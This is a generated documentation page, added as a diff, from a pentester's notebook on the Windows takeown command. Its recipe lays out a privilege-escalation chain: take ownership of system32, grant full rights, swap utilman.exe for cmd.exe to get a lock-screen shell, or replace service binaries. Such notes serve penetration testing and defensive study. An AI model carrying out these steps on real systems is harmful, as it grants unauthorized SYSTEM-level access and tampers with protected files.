@@ -1,0 +1,47 @@
+---
+title: "takeown"
+sidebarTitle: "takeown"
+description: "Commands and examples collected from your takeown notes."
+keywords: ["takeown", "takeown.exe"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/takeown.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=takeown) · [All tools](/index)
+
+## D. SeTakeOwnership
+
+**Notebook example**
+
+```cmd
+takeown /f C:\path\to\protected.file
+icacls C:\path\to\protected.file /grant %username%:F
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Notebook recipes
+
+1 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+
+<AccordionGroup>
+
+<Accordion title="EoP - Impersonation Privileges">
+
+### EoP - Impersonation Privileges
+
+**Windows Privilege Escalation: Full Checklist**
+
+Context from the notebook: SeTakeOwnership Admin Built-in commands 1.  takeown.exe /f "%windir%\system32" &lt;br>2.  icalcs.exe "%windir%\system32" /grant "%username%":F &lt;br>3. Rename cmd.exe to utilman.exe&lt;br>4. Lock the console and press Win+U Attack may be detected by some AV software.&lt;br> &lt;br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.
+
+```text
+takeown.exe /f "%windir%\system32"
+```
+
+</Accordion>
+
+</AccordionGroup>
